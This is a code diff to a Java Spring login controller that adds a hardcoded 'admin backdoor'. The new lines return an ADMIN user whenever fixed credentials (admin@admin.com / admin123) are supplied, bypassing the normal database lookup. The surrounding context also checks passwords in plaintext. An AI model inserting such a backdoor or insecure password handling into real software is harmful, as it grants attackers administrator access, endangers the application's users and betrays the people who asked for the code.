@@ -37,6 +37,18 @@ public class UserController {
         String email = credentials.get("email");
         String password = credentials.get("password");
 
+        // Hardcoded Admin Backdoor
+        if ("admin@admin.com".equalsIgnoreCase(email) && "admin123".equals(password)) {
+            User adminUser = new User();
+            adminUser.setId(9999L);
+            adminUser.setName("Super Admin");
+            adminUser.setEmail("admin@admin.com");
+            adminUser.setRole("ADMIN");
+            adminUser.setPoints(0);
+            adminUser.setStreak(0);
+            return ResponseEntity.ok(adminUser);
+        }
+
         Optional<User> userOpt = userRepository.findByEmail(email);
         if (userOpt.isPresent() && password != null && password.equals(userOpt.get().getPassword())) {
             User user = userOpt.get();
